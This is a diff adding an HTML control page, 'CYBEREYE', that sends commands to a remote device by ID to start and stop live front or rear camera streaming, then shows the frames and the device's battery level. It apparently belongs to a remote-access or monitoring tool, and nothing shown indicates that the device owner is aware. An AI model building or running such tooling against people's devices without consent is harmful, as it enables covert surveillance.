@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CYBEREYE — Live Camera Node</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        :root {
+            --brand: #2ECC8F;
+            --bg: #050507;
+            --card: #0d0d0f;
+            --border: #1f1f23;
+            --accent: #22d3ee;
+            --danger: #ef4444;
+            --btn-bg: #161618;
+            --silver: #a1a1aa;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background: var(--bg);
+            color: #fff;
+            font-family: 'Inter', sans-serif;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .layout {
+            display: grid;
+            grid-template-columns: 360px 1fr;
+            gap: 50px;
+            padding: 20px;
+            max-width: 1400px;
+            width: 100%;
+            height: 98vh;
+            align-items: center;
+        }
+
+        /* ── SIDEBAR ── */
+        .controls-panel {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            padding: 25px;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 20px;
+            border: 1px solid var(--border);
+            backdrop-filter: blur(10px);
+        }
+
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.6rem;
+            letter-spacing: 3px;
+        }
+        .logo .white { background: linear-gradient(#fff, #9ca3af); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .logo .cyan { background: linear-gradient(#22d3ee, #0891b2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-left: 4px; }
+
+        .section-label {
+            font-size: 9px;
+            color: #52525b;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border-radius: 10px;
+            font-weight: 700;
+            cursor: pointer;
+            border: 1px solid var(--border);
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-family: inherit;
+            font-size: 12px;
+            text-transform: uppercase;
+            position: relative;
+        }
+
+        .btn-start { background: var(--btn-bg); color: #fff; }
+        .btn-start:hover:not(:disabled) { border-color: var(--brand); color: var(--brand); }
+
+        .btn-stop { background: var(--btn-bg); color: #fff; }
+        .btn-stop:hover:not(:disabled) { border-color: var(--danger); color: var(--danger); }
+
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn:disabled::after {
+            content: "Stop first then use";
+            position: absolute;
+            bottom: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #000;
+            color: var(--danger);
+            font-size: 10px;
+            padding: 4px 8px;
+            border-radius: 4px;
+            white-space: nowrap;
+            opacity: 0;
+            pointer-events: none;
+            transition: 0.2s;
+            border: 1px solid var(--danger);
+        }
+        .btn:disabled:hover::after { opacity: 1; transform: translateX(-50%) translateY(-5px); }
+
+        .pill-group { display: flex; gap: 6px; }
+        .time-pill {
+            flex: 1;
+            background: var(--btn-bg);
+            border: 1px solid var(--border);
+            color: #71717a;
+            padding: 8px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 10px;
+        }
+        .time-pill.active { border-color: var(--brand); color: #fff; }
+        .time-pill:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        .custom-select {
+            width: 100%;
+            background: var(--btn-bg);
+            border: 1px solid var(--border);
+            color: #eee;
+            padding: 10px;
+            border-radius: 8px;
+            outline: none;
+            font-weight: 600;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        .custom-select:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        /* ── CAMERA STAGE ── */
+        .mirror-stage {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            height: 100%;
+            width: 100%;
+        }
+
+        .phone-frame {
+            width: 380px;
+            height: 800px;
+            background: #000;
+            border-radius: 54px;
+            padding: 10px;
+            position: relative;
+            margin-top: -25px;
+            box-shadow:
+                0 0 0 2px #222,
+                0 0 0 8px #0a0a0c,
+                0 40px 100px rgba(0,0,0,0.9);
+        }
+
+        /* Hardware Buttons */
+        .frame-btn {
+            position: absolute;
+            background: #c0c0c0;
+            border-radius: 2px;
+            width: 4px;
+            z-index: 10;
+            box-shadow: 0 0 5px rgba(255,255,255,0.2);
+        }
+        .btn-vol-up { top: 120px; right: -11px; height: 50px; }
+        .btn-vol-down { top: 185px; right: -11px; height: 50px; }
+        .btn-power { top: 150px; left: -11px; height: 60px; }
+
+        .phone-frame::before {
+            content: '';
+            position: absolute;
+            top: 22px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 6px;
+            background: #151518;
+            border-radius: 10px;
+            z-index: 20;
+        }
+
+        .phone-screen {
+            width: 100%;
+            height: 100%;
+            background: #000;
+            border-radius: 44px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            border: 1px solid #111;
+            position: relative;
+        }
+
+        .mirror-content {
+            flex: 1;
+            width: 100%;
+            position: relative;
+            background: #000;
+            overflow: hidden;
+        }
+
+        .mirror-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .placeholder {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: #050507;
+            z-index: 5;
+            color: #222;
+        }
+
+        .status-footer {
+            font-size: 10px;
+            color: #3f3f46;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+        }
+
+        /* SMART TOAST POPUP */
+        #smart-toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #111;
+            border-left: 4px solid var(--brand);
+            padding: 15px 25px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            transform: translateX(200%);
+            transition: transform 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            z-index: 9999;
+        }
+        #smart-toast.show { transform: translateX(0); }
+        #smart-toast i { color: var(--brand); font-size: 18px; }
+        #smart-toast span { font-size: 13px; font-weight: 600; color: #eee; }
+
+        .live-dot { width: 5px; height: 5px; background: var(--danger); border-radius: 50%; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+    </style>
+</head>
+<body>
+
+    <div id="smart-toast">
+        <i class="fas fa-circle-check"></i>
+        <span id="toast-msg">Command Execution Success</span>
+    </div>
+
+    <div class="layout">
+        <div class="controls-panel">
+            <div class="logo"><span class="white">CYBER</span><span class="cyan">EYE</span></div>
+
+            <div style="display:flex; flex-direction:column; gap:15px; margin-top:10px;">
+                <div>
+                    <span class="section-label">Camera Facing</span>
+                    <select class="custom-select" id="camera-lens">
+                        <option value="front" selected>Front Camera</option>
+                        <option value="rear">Rear Camera</option>
+                    </select>
+                </div>
+
+                <div>
+                    <span class="section-label">Session Limit</span>
+                    <div class="pill-group">
+                        <button class="time-pill" data-sec="15">15S</button>
+                        <button class="time-pill" data-sec="30">30S</button>
+                        <button class="time-pill active" data-sec="60">1M</button>
+                        <button class="time-pill" data-sec="300">5M</button>
+                    </div>
+                </div>
+
+                <div>
+                    <span class="section-label">Capture Delay (Interval)</span>
+                    <select class="custom-select" id="fps-val">
+                        <option value="300">300ms (Real-Time)</option>
+                        <option value="500" selected>500ms (Default)</option>
+                        <option value="1000">1s (Standard)</option>
+                        <option value="2000">2s (Saver)</option>
+                    </select>
+                </div>
+
+                <div>
+                    <span class="section-label">Compression Quality</span>
+                    <select class="custom-select" id="quality-val">
+                        <option value="15">15% - FAST STREAM</option>
+                        <option value="30" selected>30% - MID QUALITY</option>
+                        <option value="50">50% - BALANCED</option>
+                        <option value="75">75% - HIGH DETAIL</option>
+                    </select>
+                </div>
+
+                <button class="btn btn-start" id="start-btn"><i class="fas fa-play"></i> START LIVE CAMERA</button>
+                <button class="btn btn-stop" id="stop-btn" disabled><i class="fas fa-stop"></i> STOP STREAM</button>
+            </div>
+
+            <div class="status-footer">
+                <i class="fas fa-satellite-dish"></i> Node standby
+            </div>
+        </div>
+
+        <div class="mirror-stage">
+            <div class="phone-frame">
+                <!-- Hardware Buttons -->
+                <div class="frame-btn btn-vol-up"></div>
+                <div class="frame-btn btn-vol-down"></div>
+                <div class="frame-btn btn-power"></div>
+
+                <div class="phone-screen">
+                    <div class="mirror-content">
+                        <div class="placeholder" id="placeholder">
+                            <i class="fas fa-camera-slash" style="font-size:24px; opacity:0.15"></i>
+                            <span style="font-size:10px; color:#333; margin-top:10px; letter-spacing:1px;">CAMERA STREAM SHUT</span>
+                        </div>
+                        <img id="mirror-img" class="mirror-img" src="" alt="Live Camera Feed">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const deviceID = urlParams.get('id');
+        let isMirroring = false, lastTime = 0, sessionTimer = null;
+
+        function showPopup(msg, isError = false) {
+            const toast = document.getElementById('smart-toast');
+            const msgEl = document.getElementById('toast-msg');
+            const icon = toast.querySelector('i');
+
+            msgEl.textContent = msg;
+            toast.style.borderColor = isError ? 'var(--danger)' : 'var(--brand)';
+            icon.className = isError ? 'fas fa-circle-exclamation' : 'fas fa-circle-check';
+            icon.style.color = isError ? 'var(--danger)' : 'var(--brand)';
+
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        function updateStatus() {
+            if(!deviceID) return;
+            fetch(`/api/device/${deviceID}/live_camera_status`)
+                .then(r => r.json())
+                .then(data => {
+                    if (data.url && data.time > lastTime) {
+                        const frameTime = data.time;
+                        const imgPreload = new Image();
+                        imgPreload.src = data.url + "&t=" + frameTime;
+                        imgPreload.onload = () => {
+                            if (frameTime > lastTime) {
+                                lastTime = frameTime;
+                                document.getElementById('mirror-img').src = imgPreload.src;
+                                document.getElementById('placeholder').style.display = 'none';
+                                
+                                const latency = ((Date.now() - frameTime) / 1000).toFixed(1);
+                                const latencyText = latency > 5 ? `Lag: ${latency}s (Slow)` : `Latency: ${latency}s`;
+                                const statusColor = latency > 5 ? 'var(--danger)' : 'var(--brand)';
+
+                                document.querySelector('.status-footer').innerHTML = `
+                                    <div class="live-dot" style="background: ${statusColor}"></div> 
+                                    LIVE CAMERA ACTIVE &bull; ${latencyText} &bull; Bat: ${data.bat || '--'}%
+                                `;
+                                document.getElementById('stop-btn').disabled = false;
+                            }
+                        };
+                    }
+                })
+                .catch(e => console.error(e));
+        }
+        setInterval(updateStatus, 300);
+
+        function toggleControls(disable) {
+            document.getElementById('start-btn').disabled = disable;
+            document.getElementById('camera-lens').disabled = disable;
+            document.getElementById('quality-val').disabled = disable;
+            document.getElementById('fps-val').disabled = disable;
+            document.querySelectorAll('.time-pill').forEach(p => p.disabled = disable);
+        }
+
+        document.getElementById('start-btn').onclick = async () => {
+            if(!deviceID) return alert("Device ID required");
+            const lens = document.getElementById('camera-lens').value;
+            const sec = document.querySelector('.time-pill.active').dataset.sec;
+            const q = document.getElementById('quality-val').value;
+            const fps = document.getElementById('fps-val').value;
+
+            isMirroring = true;
+            toggleControls(true);
+            document.getElementById('stop-btn').disabled = false;
+
+            await fetch(`/api/device/${deviceID}/action`, {
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({action:`START_LIVE_CAMERA:${lens}:${sec}:${q}:${fps}`})
+            });
+            showPopup(`Starting live ${lens} camera...`);
+
+            if(sessionTimer) clearTimeout(sessionTimer);
+            sessionTimer = setTimeout(async () => {
+                showPopup("Live Session finished. Stream Stopped.", true);
+                stopStreamUI();
+                await fetch(`/api/device/${deviceID}/action`, {
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({action:'STOP_LIVE_CAMERA'})
+                });
+            }, sec * 1000);
+        };
+
+        function stopStreamUI() {
+            isMirroring = false;
+            toggleControls(false);
+            document.getElementById('stop-btn').disabled = true;
+            document.getElementById('placeholder').style.display = 'flex';
+            document.getElementById('mirror-img').src = "";
+            document.querySelector('.status-footer').innerHTML = `<i class="fas fa-satellite-dish"></i> Node standby`;
+        }
+
+        document.getElementById('stop-btn').onclick = async () => {
+            if(sessionTimer) clearTimeout(sessionTimer);
+            stopStreamUI();
+            await fetch(`/api/device/${deviceID}/action`, {
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({action:'STOP_LIVE_CAMERA'})
+            });
+            showPopup("Live Camera Pipeline Closed");
+        };
+
+        document.querySelectorAll('.time-pill').forEach(p => p.onclick = () => {
+            document.querySelectorAll('.time-pill').forEach(x => x.classList.remove('active'));
+            p.classList.add('active');
+        });
+    </script>
+</body>
+</html>
